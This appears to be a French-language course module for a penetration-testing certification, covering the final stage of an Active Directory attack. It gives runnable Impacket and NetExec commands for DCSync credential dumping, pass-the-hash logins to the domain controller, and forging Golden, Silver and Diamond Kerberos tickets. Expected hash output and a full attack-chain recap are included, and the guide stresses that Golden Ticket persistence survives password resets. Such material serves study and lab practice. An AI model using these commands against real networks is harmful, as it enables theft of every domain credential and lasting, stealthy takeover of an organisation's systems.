# Phase 6 : Compromission Totale

Tu es Domain Admin, ou tu as le droit **DCSync**. C'est la fin de partie.

!!! tip "Référence Impacket"
    Cette phase repose entièrement sur Impacket : `secretsdump.py` (DCSync), `ticketer.py` (Golden Ticket), `psexec.py` / `wmiexec.py` (accès Administrator). Référence complète : [Impacket](../outils/impacket.md)

---

## 6.1 : DCSync

### Le concept

Tu simules un **contrôleur de domaine secondaire** qui demande une réplication des données. Le DC te répond avec **tous les hashes de tous les comptes du domaine**, y compris `Administrator` et `KRBTGT`.

```
Attaquant → "Je suis un DC secondaire, donne-moi les réplications"
    ↓
DC répond avec tous les hashes (protocole DRSUAPI)
    ↓
Administrator:500:...:HASH...
krbtgt:502:...:HASH...
alice:1104:...:HASH...
```

### Prérequis

Avoir un compte avec l'un de ces droits sur le domaine :
- Membre de **Domain Admins**
- Membre de **Enterprise Admins**
- Droit **DS-Replication-Get-Changes-All** (explicitement délégué)

### Commandes

```bash
# DCSync complet avec mot de passe
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP \
    -just-dc-ntlm | tee ~/certif/loot/ntds_dump.txt

# DCSync avec hash (Pass-the-Hash)
secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP \
    -just-dc-ntlm | tee ~/certif/loot/ntds_dump.txt

# DCSync via ticket Kerberos (Pass-the-Ticket)
secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_FQDN \
    -just-dc | tee ~/certif/loot/ntds_dump.txt

# Dump uniquement krbtgt
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP \
    -just-dc-user krbtgt

# Via nxc
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --ntds | tee ~/certif/loot/ntds_nxc.txt
```

### Output attendu

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF001122:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:112233AABBCCDDEEFF:::
alice:1104:aad3b435b51404eeaad3b435b51404ee:...:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:...:::
[*] Domain SID: S-1-5-21-XXX-YYY-ZZZ
```

### Extraire les informations critiques

```bash
# Hash Administrator (RID 500)
grep "Administrator:" ~/certif/loot/ntds_dump.txt | head -1

# Hash krbtgt (pour Golden Ticket)
grep "krbtgt:" ~/certif/loot/ntds_dump.txt

# SID du domaine
grep "Domain SID" ~/certif/loot/ntds_dump.txt

# Exporter variables
ADMIN_HASH=$(grep "Administrator:" ~/certif/loot/ntds_dump.txt | head -1 | awk -F':' '{print $4}')
KRBTGT_HASH=$(grep "krbtgt:" ~/certif/loot/ntds_dump.txt | head -1 | awk -F':' '{print $4}')
DOMAIN_SID=$(grep "Domain SID" ~/certif/loot/ntds_dump.txt | awk '{print $NF}')

echo "ADMIN_HASH: $ADMIN_HASH"
echo "KRBTGT_HASH: $KRBTGT_HASH"
echo "DOMAIN_SID: $DOMAIN_SID"
```

---

## 6.2 : Se connecter en tant qu'Administrator

```bash
# Via psexec (shell SYSTEM)
psexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP

# Via evil-winrm
evil-winrm -i $DC_IP -u Administrator -H $ADMIN_HASH

# Via wmiexec
wmiexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP

# Vérification nxc
nxc smb $DC_IP -u Administrator -H $ADMIN_HASH -d $DOMAIN
```

---

## 6.3 : Golden Ticket

### Le concept

Avec le hash NT de **KRBTGT**, tu peux forger un TGT valide pour **n'importe quel compte**, même inexistant, avec **n'importe quels droits**. C'est la persistance totale.

```bash
# Forger le Golden Ticket
ticketer.py \
    -nthash $KRBTGT_HASH \
    -domain-sid $DOMAIN_SID \
    -domain $DOMAIN_FQDN \
    Administrator

# Charger le ticket
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

### Utiliser le Golden Ticket

```bash
# OBLIGATOIRE : utiliser le FQDN du DC (pas l'IP) pour Kerberos
# Vérifier que /etc/hosts contient le DC_FQDN

psexec.py  -k -no-pass $DOMAIN/Administrator@$DC_FQDN
wmiexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN

# nxc en mode Kerberos
nxc smb $DC_FQDN -u Administrator --use-kcache -d $DOMAIN

# Dump NTDS via le ticket
secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN -just-dc
```

!!! danger "Persistance maximale"
    Même si tous les mots de passe sont changés après ton départ, ton Golden Ticket reste valide jusqu'à ce que le mot de passe de **KRBTGT soit changé deux fois**. Valide 10 ans par défaut.

---

## 6.4 : Silver Ticket

Forger un **TGS** pour un service spécifique : sans passer par le DC.

```bash
ticketer.py \
    -nthash $SVC_HASH \
    -domain-sid $DOMAIN_SID \
    -domain $DOMAIN_FQDN \
    -spn MSSQLSvc/sql01.entreprise.local:1433 \
    Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
mssqlclient.py -k Administrator@sql01.entreprise.local
```

---

## 6.5 : Diamond Ticket (variante furtive)

Modifie le PAC d'un TGT légitime : moins détectable.

```bash
ticketer.py \
    -nthash $KRBTGT_HASH \
    -domain-sid $DOMAIN_SID \
    -domain $DOMAIN_FQDN \
    -request -user $USER -password $PWD \
    -dc-ip $DC_IP \
    Administrator
```

---

## 6.6 : Actions post-compromission

```bash
# Chercher les flags restants avec Administrator
nxc smb $RANGE -u Administrator -H $ADMIN_HASH -d $DOMAIN --shares
nxc smb $RANGE -u Administrator -H $ADMIN_HASH -d $DOMAIN -M spider_plus

# Récupérer le SID (si pas encore fait)
lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0 | head
```

---

## 6.7 : Récapitulatif : la chaîne complète

```
RECONNAISSANCE
  Nmap → identifier DC, services ouverts

ACCÈS INITIAL
  Responder → capturer hashes NTLMv2
  MITMv6    → relay vers LDAP/SMB
  Password Spraying → tester mots de passe faibles

ÉNUMÉRATION
  NetExec → cartographier le réseau
  BloodHound → trouver les chemins d'escalade
  SYSVOL → flags + cpassword GPP

ESCALADE DE PRIVILÈGES
  Kerberoasting → cracker les comptes de service
  AS-REP Roasting → comptes sans pré-auth
  Abus ACL → exploiter les mauvaises configurations

MOUVEMENT LATÉRAL
  Pass-the-Hash → se déplacer avec des hashes
  WinRM/SMB → exécution de commandes à distance

COMPROMISSION TOTALE
  DCSync → dumper tous les hashes
  Golden Ticket → persistance totale (10 ans)
```

---

## Checklist Phase 6

- [ ] DCSync réussi → `ntds_dump.txt` sauvegardé
- [ ] Hash `Administrator` récupéré et noté
- [ ] Hash `KRBTGT` récupéré et noté
- [ ] `Domain SID` noté
- [ ] Connexion Administrator sur DC validée
- [ ] Golden Ticket forgé et testé
- [ ] Flags restants cherchés avec le compte Administrator
- [ ] **PROOF OF COMPROMISE** documenté (screenshot/log)
